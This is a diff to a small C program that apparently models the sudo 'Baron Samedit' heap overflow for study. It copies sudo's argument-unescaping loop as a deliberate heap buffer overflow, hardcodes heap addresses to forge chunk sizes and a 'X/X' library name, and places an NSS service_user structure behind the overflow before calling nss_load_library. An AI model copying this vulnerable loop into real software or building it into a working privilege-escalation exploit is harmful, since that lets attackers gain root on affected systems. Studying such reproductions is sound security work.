@@ -71,44 +71,51 @@ nss_load_library(service_user *ni)
 
 int main(int argc, char **argv)
 {
-	size_t size = 0;
-	char **av;
 	char *user_args;
-	char *to;
-	char *from;
 
-	// allocate destination
-	for (size = 0, av = argv + 1; *av; av++)
-		size += strlen(*av) + 1;
-	if (size == 0 || (user_args = malloc(size)) == NULL)
+	// https://github.com/sudo-project/sudo/blob/8255ed69b9c426d90a10c6d68e8d2241d7f3260e/plugins/sudoers/sudoers.c#L863
+	/* set user_args */
+	if (argc > 1)
 	{
-		printf("Invalid size or malloc\n");
-		exit(1);
-	}
+		char *to, *from, **av;
+		size_t size, n;
 
-	// allocate on the heap behind user_args
-	service_user *ni = malloc(sizeof(service_user));
-	ni->library = malloc(sizeof(service_library));
-
-	// heap buffer overflow vulnerability
-	// https://github.com/sudo-project/sudo/blob/8255ed69b9c426d90a10c6d68e8d2241d7f3260e/plugins/sudoers/sudoers.c#L877
-	for (to = user_args, av = argv + 1; (from = *av); av++)
-	{
-		while (*from)
+		/* Alloc and build up user_args. */
+		for (size = 0, av = argv + 1; *av; av++)
+			size += strlen(*av) + 1;
+		if (size == 0 || (user_args = malloc(size)) == NULL) {
+			exit(EXIT_FAILURE);
+		};
+		/*
+		 * When running a command via a shell, the sudo front-end
+		 * escapes potential meta chars.  We unescape non-spaces
+		 * for sudoers matching and logging purposes.
+		 */
+		for (to = user_args, av = argv + 1; (from = *av); av++)
 		{
-			if (from[0] == '\\' && !isspace((unsigned char)from[1]))
-				from++;
-			*to++ = *from++;
+			while (*from)
+			{
+				// heap buffer overflow vulnerability
+				if (from[0] == '\\' && !isspace((unsigned char)from[1]))
+					from++;
+				*to++ = *from++;
+			}
+			*to++ = ' ';
 		}
-		*to++ = ' ';
+		*--to = '\0';
 	}
-	// TODO: buffer overflow needs fix the following addresses
-	int *first_size = (void *)0x804d1bc;
-	int *second_size = (void *)0x804d1ec;
-	char *name = (void *)0x804d1f0; // this is 0x804d1e0 when started via GDB
+
+	// TODO: buffer overflow needs to fix the following addresses:
+	int *first_size = (void *)0x5655a1bc;
+	int *second_size = (void *)0x5655a1ec;
+	char *name = (void *)0x5655a1f0; // this is 0x5655a1e0 when started via GDB
 	*first_size = 0x00000031;
 	*second_size = 0x00000011;
 	strcpy(name, "X/X");
+
+	// allocated service_user behind heap buffer overflow
+	service_user *ni = malloc(sizeof(service_user));
+	ni->library = malloc(sizeof(service_library));
 
 	// call nss_load_libary behind heap buffer overflow
 	nss_load_library(ni);
